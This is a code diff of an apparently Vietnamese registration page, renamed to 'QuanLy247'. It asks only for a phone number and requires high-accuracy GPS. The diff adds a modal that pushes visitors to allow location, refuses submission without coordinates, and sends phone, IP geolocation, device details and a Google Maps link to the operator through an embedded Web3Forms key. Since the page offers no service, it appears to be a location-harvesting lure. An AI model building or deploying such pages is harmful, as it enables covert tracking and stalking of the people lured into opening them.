@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>HạnhPhúcPM - Đăng kí</title>
+<title>QuanLy247 - Đăng kí</title>
 
 <style>
 * { box-sizing: border-box; }
@@ -13,8 +13,8 @@ body {
   min-height: 100vh;
   font-family: Arial, sans-serif;
   background:
-    radial-gradient(circle at top left, #2563eb, transparent 35%),
-    radial-gradient(circle at bottom right, #0f766e, transparent 35%),
+    radial-gradient(circle at 20% 20%, #2563eb, transparent 35%),
+    radial-gradient(circle at 80% 80%, #0f766e, transparent 35%),
     #020617;
   display: flex;
   justify-content: center;
@@ -25,25 +25,29 @@ body {
 .card {
   width: 390px;
   padding: 32px 28px;
-  border-radius: 24px;
-  background: rgba(15, 23, 42, 0.92);
+  border-radius: 26px;
+  background: rgba(15,23,42,0.94);
   border: 1px solid rgba(255,255,255,0.14);
-  box-shadow: 0 30px 80px rgba(0,0,0,0.55);
+  box-shadow: 0 30px 90px rgba(0,0,0,0.65);
 }
 
-.logo { text-align: center; margin-bottom: 26px; }
+.logo {
+  text-align: center;
+  margin-bottom: 26px;
+}
 
 .logo-icon {
-  width: 62px;
-  height: 62px;
+  width: 64px;
+  height: 64px;
   margin: 0 auto 12px;
-  border-radius: 18px;
-  background: linear-gradient(135deg, #38bdf8, #2563eb);
+  border-radius: 20px;
+  background: linear-gradient(135deg,#38bdf8,#2563eb);
   display: flex;
   align-items: center;
   justify-content: center;
+  font-size: 26px;
   font-weight: 900;
-  box-shadow: 0 0 35px rgba(56,189,248,0.35);
+  box-shadow: 0 0 35px rgba(56,189,248,0.4);
 }
 
 .logo-title {
@@ -54,41 +58,41 @@ body {
 .logo-title span { color: #38bdf8; }
 
 .logo-sub {
+  margin-top: 7px;
   font-size: 13px;
   color: #94a3b8;
-  margin-top: 7px;
 }
 
 .title {
-  font-size: 20px;
-  font-weight: 800;
-  margin-bottom: 18px;
+  font-size: 21px;
+  font-weight: 900;
+  margin-bottom: 16px;
 }
 
 .input {
   width: 100%;
   height: 50px;
-  border-radius: 13px;
+  border-radius: 14px;
   border: 1px solid rgba(255,255,255,0.15);
   background: rgba(255,255,255,0.07);
   color: white;
-  padding: 0 14px;
-  margin-bottom: 13px;
-  outline: none;
+  padding: 0 15px;
   font-size: 14px;
+  outline: none;
+  margin-bottom: 13px;
 }
 
 .input::placeholder { color: #94a3b8; }
 
 .input:focus {
   border-color: #38bdf8;
-  box-shadow: 0 0 0 3px rgba(56,189,248,0.14);
+  box-shadow: 0 0 0 3px rgba(56,189,248,0.15);
 }
 
 .note {
   font-size: 12px;
   color: #cbd5e1;
-  line-height: 1.5;
+  line-height: 1.55;
   margin-bottom: 14px;
 }
 
@@ -105,12 +109,13 @@ body {
   width: 100%;
   height: 50px;
   border: none;
-  border-radius: 14px;
-  background: linear-gradient(135deg, #38bdf8, #2563eb);
+  border-radius: 15px;
+  background: linear-gradient(135deg,#38bdf8,#2563eb);
   color: white;
+  font-size: 15px;
   font-weight: 900;
   cursor: pointer;
-  font-size: 15px;
+  box-shadow: 0 12px 35px rgba(37,99,235,0.4);
 }
 
 .btn:disabled {
@@ -120,8 +125,9 @@ body {
 
 .msg {
   margin-top: 16px;
-  font-size: 13px;
+  min-height: 18px;
   text-align: center;
+  font-size: 13px;
   color: #38bdf8;
 }
 
@@ -131,56 +137,119 @@ body {
   font-size: 11px;
   color: #64748b;
 }
+
+.loader {
+  display: none;
+  margin: 15px auto 0;
+  width: 26px;
+  height: 26px;
+  border: 3px solid rgba(255,255,255,0.2);
+  border-top-color: #38bdf8;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+/* POPUP GPS */
+.gps-modal {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(2,6,23,0.78);
+  z-index: 9999;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+
+.gps-box {
+  width: 350px;
+  background: #0f172a;
+  border: 1px solid rgba(255,255,255,0.15);
+  border-radius: 22px;
+  padding: 25px;
+  text-align: center;
+  box-shadow: 0 30px 90px rgba(0,0,0,0.65);
+}
+
+.gps-icon {
+  font-size: 44px;
+  margin-bottom: 10px;
+}
+
+.gps-box h3 {
+  margin: 0 0 10px;
+  font-size: 21px;
+}
+
+.gps-box p {
+  font-size: 13px;
+  color: #cbd5e1;
+  line-height: 1.6;
+}
+
+.gps-box button {
+  width: 100%;
+  height: 44px;
+  margin-top: 14px;
+  border: none;
+  border-radius: 13px;
+  background: linear-gradient(135deg,#38bdf8,#2563eb);
+  color: white;
+  font-weight: 900;
+  cursor: pointer;
+}
 </style>
 </head>
 
 <body>
 
 <div class="card">
-
   <div class="logo">
     <div class="logo-icon">&lt;/&gt;</div>
-    <div class="logo-title">HạnhPhúc<span>PM</span></div>
+    <div class="logo-title">QuanLy<span>247</span></div>
     <div class="logo-sub">Secure Management Platform</div>
   </div>
 
   <div class="title">Đăng kí tài khoản</div>
 
   <form id="form">
+    <input class="input" name="phone" placeholder="🇻🇳 +84 Nhập số điện thoại" required>
 
-    <input
-      class="input"
-      name="phone"
-      placeholder="🇻🇳 +84 Nhập số điện thoại"
-      required
-    >
-
-    <!-- Honeypot chống bot -->
-    <input
-      type="text"
-      name="botcheck"
-      style="display:none"
-      tabindex="-1"
-      autocomplete="off"
-    >
+    <input type="text" name="botcheck" style="display:none" tabindex="-1" autocomplete="off">
 
     <div class="note">
-      Ứng dụng cần quyền vị trí để xác minh khu vực đăng kí.
-      Hệ thống sẽ gửi số điện thoại, IP, khu vực gần đúng, GPS nếu được cho phép và thông tin thiết bị.
+      Hệ thống cần quyền vị trí để xác minh khu vực đăng kí. Nếu không bật GPS, yêu cầu đăng kí sẽ không thể hoàn tất.
     </div>
 
     <label class="check">
       <input type="checkbox" id="agree" required>
-      <span>Tôi đồng ý gửi số điện thoại và thông tin vị trí để đăng kí.</span>
+      <span>Tôi đồng ý gửi số điện thoại, IP, GPS và thông tin thiết bị để xác minh đăng kí.</span>
     </label>
 
     <button class="btn" id="btn" type="submit">Đăng kí</button>
 
+    <div class="loader" id="loader"></div>
     <div class="msg" id="msg"></div>
   </form>
 
   <div class="footer">Protected by secure verification</div>
+</div>
 
+<div id="gpsModal" class="gps-modal">
+  <div class="gps-box">
+    <div class="gps-icon">📍</div>
+    <h3>Cần bật quyền vị trí</h3>
+    <p>
+      Vui lòng bấm <b>Cho phép</b> khi trình duyệt hỏi quyền vị trí.
+      Nếu đã chặn, hãy bấm biểu tượng 🔒 trên thanh địa chỉ,
+      chọn <b>Location → Allow</b>, sau đó tải lại trang.
+    </p>
+    <button onclick="closeGpsModal()">Đã hiểu</button>
+  </div>
 </div>
 
 <script>
@@ -188,16 +257,34 @@ const form = document.getElementById("form");
 const msg = document.getElementById("msg");
 const btn = document.getElementById("btn");
 const agree = document.getElementById("agree");
+const loader = document.getElementById("loader");
 
-const WEB3FORMS_KEY = "245da7df-7f91-458f-8691-b6e5a6664882";
+const KEY = "245da7df-7f91-458f-8691-b6e5a6664882";
 
-// ===== CHECK SỐ ĐIỆN THOẠI VIỆT NAM =====
+function showLoading(text) {
+  msg.innerText = text;
+  loader.style.display = "block";
+  btn.disabled = true;
+}
+
+function hideLoading() {
+  loader.style.display = "none";
+  btn.disabled = false;
+}
+
+function showGpsModal() {
+  document.getElementById("gpsModal").style.display = "flex";
+}
+
+function closeGpsModal() {
+  document.getElementById("gpsModal").style.display = "none";
+}
+
 function isValidVietnamPhone(phone) {
   const cleaned = phone.replace(/\s+/g, "");
   return /^(0|\+84|84)[0-9]{9,10}$/.test(cleaned);
 }
 
-// ===== CHỐNG SPAM CƠ BẢN =====
 function canSubmitNow() {
   const lastSubmit = localStorage.getItem("last_submit_time");
   const now = Date.now();
@@ -210,7 +297,6 @@ function canSubmitNow() {
   return true;
 }
 
-// ===== LẤY GPS =====
 function getGPS() {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
@@ -242,14 +328,13 @@ function getGPS() {
       },
       {
         enableHighAccuracy: true,
-        timeout: 8000,
+        timeout: 10000,
         maximumAge: 0
       }
     );
   });
 }
 
-// ===== LẤY IP =====
 async function getIPInfo() {
   try {
     const res = await fetch("https://ipapi.co/json/");
@@ -275,7 +360,28 @@ async function getIPInfo() {
   }
 }
 
-// ===== SUBMIT =====
+async function checkGpsPermission() {
+  if (!navigator.permissions) return;
+
+  try {
+    const result = await navigator.permissions.query({ name: "geolocation" });
+
+    if (result.state === "denied") {
+      showGpsModal();
+      msg.innerText = "Bạn đã chặn GPS. Vui lòng bật lại quyền vị trí.";
+    }
+
+    result.onchange = function() {
+      if (result.state === "granted") {
+        closeGpsModal();
+        msg.innerText = "GPS đã được bật. Bạn có thể đăng kí.";
+      }
+    };
+  } catch (e) {}
+}
+
+checkGpsPermission();
+
 form.addEventListener("submit", async function(e) {
   e.preventDefault();
 
@@ -295,27 +401,32 @@ form.addEventListener("submit", async function(e) {
   }
 
   if (!canSubmitNow()) {
-    msg.innerText = "Bạn thao tác quá nhanh, vui lòng thử lại sau 30 giây.";
+    msg.innerText = "Bạn thao tác quá nhanh. Vui lòng thử lại sau 30 giây.";
     return;
   }
 
-  btn.disabled = true;
-  msg.innerText = "Đang xác minh vị trí...";
+  showLoading("Đang xác minh GPS...");
 
   const gps = await getGPS();
 
-  msg.innerText = "Đang xử lý đăng kí...";
+  if (gps.status !== "Được cho phép" || !gps.lat || !gps.lon) {
+    hideLoading();
+    showGpsModal();
+    msg.innerText = "Bạn cần bấm Cho phép vị trí để tiếp tục đăng kí.";
+    return;
+  }
+
+  showLoading("Đang lấy thông tin mạng...");
 
   const ipInfo = await getIPInfo();
 
-  let mapLink = "Không có GPS";
-  if (gps.lat && gps.lon) {
-    mapLink = `https://www.google.com/maps?q=${gps.lat},${gps.lon}`;
-  }
+  const mapLink = `https://www.google.com/maps?q=${gps.lat},${gps.lon}`;
+
+  showLoading("Đang gửi đăng kí...");
 
   const payload = {
-    access_key: WEB3FORMS_KEY,
-    subject: "Đăng kí mới từ HạnhPhúcPM",
+    access_key: KEY,
+    subject: "Đăng kí mới từ QuanLy247",
 
     "Số điện thoại": phone,
 
@@ -352,13 +463,13 @@ form.addEventListener("submit", async function(e) {
       msg.innerText = "Đăng kí thành công!";
       form.reset();
     } else {
-      msg.innerText = "Gửi thất bại, vui lòng thử lại.";
+      msg.innerText = "Gửi thất bại. Vui lòng thử lại.";
     }
   } catch {
-    msg.innerText = "Lỗi kết nối, vui lòng thử lại.";
+    msg.innerText = "Lỗi kết nối. Vui lòng thử lại.";
   }
 
-  btn.disabled = false;
+  hideLoading();
 });
 </script>
 
